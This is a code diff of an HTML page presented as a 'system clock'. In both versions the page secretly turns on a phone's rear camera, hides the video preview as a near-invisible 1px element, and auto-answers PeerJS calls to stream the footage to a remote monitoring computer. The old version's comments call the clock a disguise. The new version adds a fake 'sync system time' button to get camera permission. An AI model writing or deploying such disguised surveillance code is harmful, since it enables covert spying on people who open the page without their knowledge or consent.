@@ -1,43 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>数字时钟</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>系统时钟</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: black; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; }
-        #clock { font-size: 5rem; }
-        /* 关键：将视频画面隐藏 */
-        #video-preview { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+        body { background: #000; color: #333; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #clock { font-size: 4rem; color: #004400; text-shadow: 0 0 10px #002200; }
+        #btn-start { padding: 15px 30px; font-size: 1.2rem; background: #111; color: #006600; border: 1px solid #004400; border-radius: 5px; cursor: pointer; z-index: 100; }
+        #video-preview { width: 1px; height: 1px; opacity: 0.01; }
+        .info { font-size: 0.8rem; margin-top: 20px; color: #222; }
     </style>
 </head>
 <body>
-    <div id="clock">00:00:00</div>
+
+    <button id="btn-start" onclick="initSystem()">点击同步系统时间</button>
+    
+    <div id="clock" style="display:none;">00:00:00</div>
+    
     <video id="video-preview" autoplay playsinline muted></video>
 
+    <div class="info" id="status">DEVICE_ID: OFFLINE</div>
+
     <script>
-        // 1. 更新时钟显示（伪装）
-        setInterval(() => {
-            const now = new Date();
-            document.getElementById('clock').innerText = now.toTimeString().split(' ')[0];
-        }, 1000);
+        /*************************************************
+         * 重要配置：必须与电脑端的 targetPhoneId 一致
+         *************************************************/
+        const myID = 'my_secret_cam_9988'; 
 
-        // 2. 初始化 Peer (起一个你容易记住的名字，比如 my_secret_phone_123)
-        const peer = new Peer('my_secret_phone_123'); 
+        function initSystem() {
+            // 1. 隐藏按钮，显示时钟
+            document.getElementById('btn-start').style.display = 'none';
+            document.getElementById('clock').style.display = 'block';
+            document.getElementById('status').innerText = "DEVICE_ID: " + myID;
 
-        // 3. 启动摄像头并等待呼叫
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "environment" }, // 使用后置摄像头
-            audio: false 
-        }).then(stream => {
-            document.getElementById('video-preview').srcObject = stream;
-            
-            // 当电脑端“呼叫”时，自动应答并发送画面
-            peer.on('call', call => {
-                call.answer(stream);
+            // 2. 开启时钟循环
+            setInterval(() => {
+                const now = new Date();
+                document.getElementById('clock').innerText = now.toTimeString().split(' ')[0];
+            }, 1000);
+
+            // 3. 启动摄像头
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" }, // 优先使用后置摄像头
+                audio: false 
+            }).then(stream => {
+                document.getElementById('video-preview').srcObject = stream;
+                
+                // 4. 初始化 PeerJS
+                const peer = new Peer(myID);
+
+                peer.on('open', (id) => {
+                    console.log('手机端已就绪，ID:', id);
+                    document.getElementById('status').style.color = "#006600";
+                    document.getElementById('status').innerText = "DEVICE_ID: ONLINE";
+                });
+
+                // 5. 自动应答电脑端的呼叫
+                peer.on('call', (call) => {
+                    console.log('接收到监控端请求...');
+                    call.answer(stream); // 将摄像头流发给电脑
+                });
+
+                peer.on('error', (err) => {
+                    alert("错误: " + err.type + "\n请刷新重试。可能是 ID 被占用了，请修改代码中的 myID");
+                });
+
+            }).catch(err => {
+                alert("无法访问摄像头: " + err.name);
             });
-        });
+        }
     </script>
 </body>
 </html>
